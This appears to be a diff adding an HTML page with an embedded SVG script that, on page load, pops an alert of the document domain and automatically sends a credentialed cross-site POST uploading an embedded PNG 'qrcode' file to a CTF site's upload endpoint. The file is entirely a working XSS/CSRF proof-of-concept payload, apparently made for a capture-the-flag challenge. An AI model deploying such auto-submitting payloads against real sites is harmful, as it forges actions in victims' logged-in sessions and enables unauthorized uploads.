@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auto Submit SVG Form</title>
+</head>
+<body>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
+        <script type="text/javascript">
+            //<![CDATA[
+            function submitRequest() {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "http://ctf.widyasecurity.com/upload", true);
+                xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8");
+                xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+                xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------2102168281144432190187720739");
+                xhr.withCredentials = true;
+
+                var body = "-----------------------------2102168281144432190187720739\r\n" + 
+                    "Content-Disposition: form-data; name=\"qrcode\"; filename=\"test.png\"\r\n" + 
+                    "Content-Type: image/png\r\n" + 
+                    "\r\n" + 
+                    "\x89PNG\r\n" + 
+                    "\x1a\n" + 
+                    "\x00\x00\x00\rIHDR\x00\x00\x00\xfa\x00\x00\x00\xfa\x01\x03\x00\x00\x00\xb2\"\xc8~\x00\x00\x00\x06PLTE\xff\xff\xff\x00\x00\x00U\xc2\xd3~\x00\x00\x00\tpHYs\x00\x00\x0e\xc4\x00\x00\x0e\xc4\x01\x95+\x0e\x1b\x00\x00\x01\xc1IDATh\x81\xed\x98\xbb\x91\xc30\x0cD\xa1Q\xe0\x90%\xa8\x14\x96f\x95\xc6RX\x82B\x05\x1e\xe3\x80]R\x3c\xdf\xd8s\xb9\tF\"\xf4\x98`\xb0\xf8\x89\xfcw\xee\x8as\xc8\xed\xb1\x3c/\xc3q\xa3Y\xf7i\x80\xdd\xad\xc9-\xfe\xdfL\xb9\xf8\xf5\x84\x97\x02\xf8\x05d\xd5\x9a\xcc\x93\xfa\\T\xfcAvO\x9e\xab\xbf\x98\x0f0\xcf,\x0c\xa1\\6\xc3\x03\xf8\x00X\xf8\x98\xf4\xd4\xc3\xe8\x83\xab\xbf\x1d\xe8\xcaz@X\x8a\xbb\xbc\x93\xde\xe4@\xcb\xd5\xe6:\x97\x9e\xee\xf7\x92kz\x93\xcc\xbf\x1c\xb8\x0eL\xee\xa9\"\xef\xcf\xe4\x00\x3cY\x93jKA$\xd2y{\xc0\xb3s\x01z\xa4SVe\x93Sd;\xec\x81)m\x19!\x17\x00R3r\xf5j\xff\x15\xb9\x9b\xb5\x9e]O\x00\x17 \xb2UW\x1e\xdafTw^\xf1`\x9f\x05@\xcd\xda8\x3e\\\xd2K&D\x8b0\x85\xf4\x02 \xa0V\xc4\xa05zrw\xe9\x81C\xb1\xdfg\x01,\xe5dv\xc5+\xc7(E\xea\x3e[\x84I\x00c\x0e/\x08\xa8\x13\xb9\xda\x03*WF\xd4\xb3w\x833\x00\x1eR\xae\xac\xd1\xfee\x3c\x10\x8e\x13\x01t\xe0\xceA\\\xb8\xc9Qv=(YHI\x93\x01\xeaR\xea\xca*\xde\rz\xcf\xb3\xb4\\\x1d\x00\x00\x8b\xa0*\x89\xf1\xc4\\-\xad\xb8\x07\xf0\x02H\xe6|\xe1\x06J\xaf\xe3Cz\xdf\x0f\xf43j\x94\x07\x947\xc9\xbd\xb8\x07\xf0gQc\xc9Y\xb1+\xe6u\xf59Kd\x1a\x00\xbe\xe2\xdc\xd4\xaay\xe6T\xd5\xa6\xa8\x00:\x90\xdb\xaex\xd5~\xea%\xbd\x19\x01lr\xd0\xf4p\xaa\xba\xe6\xcd\x00^\x00nn\xc6\xaexHo\x12\x80\xcajKr\xde1\x3eH\x00/\x00U\xd6\xe6M|\x17\xce\xe9}\x15\x18\x00s\xf1?\xe7\x07\x0b\xae\x96\xb7/\xa4mN\x00\x00\x00\x00IEND\xaeB`\x82\r\n" + 
+                    "-----------------------------2102168281144432190187720739--\r\n";
+
+                var aBody = new Uint8Array(body.length);
+                for (var i = 0; i < aBody.length; i++) {
+                    aBody[i] = body.charCodeAt(i);
+                }
+
+                xhr.send(new Blob([aBody]));
+            }
+            
+            document.addEventListener('DOMContentLoaded', function() {
+                alert(document.domain);  // your existing script
+                submitRequest();  // auto submit the request
+            });
+            //]]>
+        </script>
+    </svg>
+</body>
+</html>
